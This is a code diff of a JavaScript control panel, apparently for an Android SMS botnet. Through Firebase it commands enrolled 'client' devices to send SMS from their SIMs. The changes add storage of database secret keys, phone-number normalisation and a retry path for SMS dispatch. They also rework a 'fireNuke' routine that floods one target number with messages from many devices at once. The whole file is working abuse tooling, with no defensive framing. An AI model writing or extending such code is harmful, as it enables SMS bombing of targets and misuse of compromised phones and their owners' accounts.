@@ -183,20 +183,47 @@ function delCookie(n){ try{ document.cookie = n + '=; expires=Thu, 01 Jan 1970 0
 function savePanelSession(){
   try{
     localStorage.setItem(CFG.LS_SESSION || 'fbi_session', JSON.stringify({
-      fbUrl: FB_URL, activeDeviceUid: activeDeviceUid || '', ts: Date.now()
+      fbUrl: FB_URL, fbKey: FB_KEY || '', activeDeviceUid: activeDeviceUid || '', ts: Date.now()
     }));
     setCookie('fbi_fburl', FB_URL, 30);
     if(activeDeviceUid) setCookie('fbi_dev', activeDeviceUid, 30);
   }catch(e){}
 }
 function restorePanelSession(){
-  var fbUrl = '', dev = '';
+  var fbUrl = '', fbKey = '', dev = '';
   try{ var raw = localStorage.getItem(CFG.LS_SESSION || 'fbi_session');
-    if(raw){ var s = JSON.parse(raw); fbUrl = s.fbUrl || ''; dev = s.activeDeviceUid || ''; }
+    if(raw){ var s = JSON.parse(raw); fbUrl = s.fbUrl || ''; fbKey = s.fbKey || ''; dev = s.activeDeviceUid || ''; }
   }catch(e){}
   if(!fbUrl) fbUrl = getCookie('fbi_fburl');
   if(!dev) dev = getCookie('fbi_dev');
-  return { fbUrl: fbUrl, activeDeviceUid: dev };
+  if(!fbKey){ try{ fbKey = localStorage.getItem('fbi_fb_key') || ''; }catch(e){} }
+  return { fbUrl: fbUrl, fbKey: fbKey, activeDeviceUid: dev };
+}
+function resolveFirebaseKeyForUrl(url){
+  var key = '';
+  var u = String(url || '').replace(/\/+$/, '');
+  try{
+    var list = userConfig.firebases || [];
+    for(var i=0;i<list.length;i++){
+      if(String(list[i].url || '').replace(/\/+$/, '') === u && list[i].key) key = String(list[i].key).trim();
+    }
+  }catch(e){}
+  if(!key){ try{ key = localStorage.getItem('fbi_fb_key') || ''; }catch(e2){} }
+  return String(key || '').trim();
+}
+function fbKeyForDev(dev){
+  if(dev && dev._fbKey != null && String(dev._fbKey).trim()) return String(dev._fbKey).trim();
+  return FB_KEY || '';
+}
+function normalizeSmsTo(num){
+  var n = String(num || '').replace(/[^\d+]/g, '');
+  if(n.indexOf('+') === 0) n = n.slice(1);
+  n = n.replace(/\D/g, '');
+  if(n.length === 13 && n.indexOf('091') === 0) n = n.slice(3);
+  if(n.length === 12 && n.indexOf('91') === 0) n = n.slice(2);
+  if(n.length === 11 && n.charAt(0) === '0') n = n.slice(1);
+  if(n.length > 10) n = n.slice(-10);
+  return n;
 }
 function clearPanelSession(){
   try{ localStorage.removeItem(CFG.LS_SESSION || 'fbi_session'); }catch(e){}
@@ -657,11 +684,24 @@ async function resetCloudConfig(){
   userConfig = JSON.parse(JSON.stringify(CFG.DEFAULT_CONFIG));
   cacheConfigLocal(); await saveCloudConfig(); toast('🗑 Reset'); populateSettingsUI();
 }
+function syncPrimaryFirebaseEntry(url, key){
+  if(!url) return;
+  if(!userConfig.firebases) userConfig.firebases = [];
+  var u = url.replace(/\/+$/, ''), hit = false;
+  userConfig.firebases.forEach(function(f){
+    if(String(f.url || '').replace(/\/+$/, '') === u){ f.key = key || f.key || ''; f.label = f.label || 'Primary'; hit = true; }
+  });
+  if(!hit) userConfig.firebases.unshift({ url: u, label: 'Primary', key: key || '' });
+  cacheConfigLocal(); debouncedCloudSave();
+}
 function autoRestoreSession(){
   var s = restorePanelSession();
   if(!s.fbUrl || FB_URL) return;
   var inp = document.getElementById('fbUrl'); if(!inp) return;
-  inp.value = s.fbUrl; connect().catch(function(){});
+  inp.value = s.fbUrl;
+  var kin = document.getElementById('fbKey');
+  if(kin && s.fbKey) kin.value = s.fbKey;
+  connect().catch(function(){});
   if(s.activeDeviceUid){
     var tries = 0;
     var tmr = setInterval(function(){
@@ -697,56 +737,52 @@ async function fbDel(p, url, key){
 }
 
 /* ═══════════════════════════════════════════════════════════════
-   ⚡⚡⚡ SMS DISPATCH — MULTI-FORMAT FALLBACK ⚡⚡⚡
-   Tries 3 payload formats + retry — should work with any client
+   SMS DISPATCH — GOD Panel (Zp) compatible PUT sendSms
    ═══════════════════════════════════════════════════════════════ */
 async function dispatchSms(dev, sim, to, message){
   if(!dev){ console.warn('[SMS] no device'); return false; }
+  var toNorm = normalizeSmsTo(to);
+  if(!toNorm){ console.warn('[SMS] invalid number'); toast('⚠ Invalid number'); return false; }
+  var simNum = parseInt(sim, 10);
+  if(isNaN(simNum) || simNum < 1) simNum = 1;
+  var text = String(message || '').trim();
+  if(!text){ console.warn('[SMS] empty message'); return false; }
 
-  var base = (dev._fbUrl || FB_URL) + '/clients/' + dev.id + '/webhookEvent/sendSms.json'
-           + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
-
-  /* Format 1 (standard) */
-  var formats = [
-    { url: base, body: { from: sim, to: to, message: message, isSended: false } },
-    { url: base, body: { from: String(sim), to: String(to), message: String(message), isSended: false, isSendedNew: false } },
-    { url: base, body: { sim: sim, to: to, message: message, isSended: false } }
+  var authKey = fbKeyForDev(dev);
+  var path = 'clients/' + dev.id + '/webhookEvent/sendSms';
+  var payloads = [
+    { from: simNum, to: toNorm, message: text, isSended: false },
+    { from: String(simNum), to: String(toNorm), message: text, isSended: false, isSendedNew: false },
+    { sim: simNum, to: toNorm, message: text, isSended: false }
   ];
 
-  for(var f=0; f<formats.length; f++){
+  for(var f=0; f<payloads.length; f++){
     try{
       var t0 = performance.now();
-      var r = await fetch(formats[f].url, {
-        method: 'PUT',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(formats[f].body)
-      });
+      await fbSet(path, payloads[f], dev._fbUrl, authKey);
       var dt = (performance.now() - t0).toFixed(0);
-      if(r.ok){
-        console.log('[SMS] ✓ format' + (f+1) + ' ' + dt + 'ms → ' + dev.name);
-        try{ notifySmsQueued(dev, to, message, dt); }catch(e){}
-        return true;
-      }
-      console.warn('[SMS] format' + (f+1) + ' → HTTP ' + r.status);
+      console.log('[SMS] ✓ queued ' + dt + 'ms → ' + dev.name + ' SIM' + simNum + ' → ' + toNorm);
+      try{ notifySmsQueued(dev, toNorm, text, dt); }catch(e){}
+      return true;
     }catch(e){
-      console.warn('[SMS] format' + (f+1) + ' → ' + e.message);
+      var msg = e && e.message ? e.message : String(e);
+      console.warn('[SMS] attempt ' + (f + 1) + ' failed:', msg);
+      if(/401|403|PERMISSION/i.test(msg) && !authKey){
+        toast('⚠ SMS ke liye Database Secret key chahiye (setup screen)');
+      }
     }
   }
-  /* Final retry after 300ms */
-  try{
-    await sleep(300);
-    var r2 = await fetch(base, {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(formats[0].body)
-    });
-    if(r2.ok){ console.log('[SMS] ✓ retry OK'); return true; }
-  }catch(e){}
-  console.error('[SMS] ✗ ALL formats failed for ' + dev.name);
+  console.error('[SMS] ✗ send failed for ' + dev.name);
   return false;
 }
 async function sendSmsGuaranteed(dev, sim, to, message){
   return await dispatchSms(dev, sim, to, message);
+}
+function resolveSmsDevice(){
+  var dev = getActiveDevice();
+  if(dev) return dev;
+  if(selDev) return selDev;
+  return null;
 }
 
 /* ═══════ ACTIVE DEVICE ═══════ */
@@ -789,14 +825,20 @@ function _removeDeadFirebaseInst(inst){
 }
 async function connect(){
   var urlEl = document.getElementById('fbUrl');
+  var keyEl = document.getElementById('fbKey');
   var url = urlEl ? urlEl.value.trim().replace(/\/+$/, '') : '';
   if(!url){ showErr('Enter your Firebase URL'); return; }
+  var key = keyEl && keyEl.value.trim ? keyEl.value.trim() : '';
+  if(!key) key = resolveFirebaseKeyForUrl(url);
+  FB_KEY = key;
+  if(FB_KEY){ try{ localStorage.setItem('fbi_fb_key', FB_KEY); }catch(e){} }
   if(!(await probeFirebase(url, FB_KEY))){
     showErr('Firebase connect nahi ho rahi — URL/key check karein ya dead DB hata dein');
     return;
   }
   ensureUserId();
   FB_URL = url;
+  syncPrimaryFirebaseEntry(url, FB_KEY);
   document.getElementById('setup').style.display = 'none';
   document.getElementById('panel').style.display = 'flex';
   savePanelSession();
@@ -1932,12 +1974,9 @@ function fireNuke(){
   function spawn(){
     while(_nukeActive < pool && idx < shots.length && nukeRunning){
       var shot = shots[idx++], dev = shot.dev;
-      var url = (dev._fbUrl || FB_URL) + '/clients/' + dev.id + '/webhookEvent/sendSms.json'
-              + ((dev._fbKey || FB_KEY) ? '?auth=' + (dev._fbKey || FB_KEY) : '');
-      var body = JSON.stringify({ from: shot.sim, to: target, message: msg, isSended: false });
       _nukeActive++;
-      _fastFetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: body })
-        .then(function(r){ if(r.ok) nukeSent++; else nukeFail++; })
+      sendSmsGuaranteed(dev, shot.sim, target, msg)
+        .then(function(ok){ if(ok) nukeSent++; else nukeFail++; })
         .catch(function(){ nukeFail++; })
         .finally(function(){
           _nukeActive--; done++;
@@ -2349,11 +2388,15 @@ function routeChannelSms(number, message, msgObj){
 
   if(!passesRestriction(number, message, msgObj)){ console.log('[Route] blocked'); return; }
 
-  var dev = getActiveDevice();
+  var dev = resolveSmsDevice();
   if(!dev){
     console.warn('[Route] No active device — open device modal first');
     toast('⚠ Pehle device open karein (jo SMS bhejega)');
     return;
+  }
+  if(!activeDeviceUid && selDev){
+    activeDeviceUid = (selDev._fbId || 'primary') + '|||' + selDev.id;
+    try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', activeDeviceUid); }catch(e){}
   }
   if(!dev.status){ console.warn('[Route] offline ' + dev.name); toast('⚠ ' + dev.name + ' offline'); return; }
 
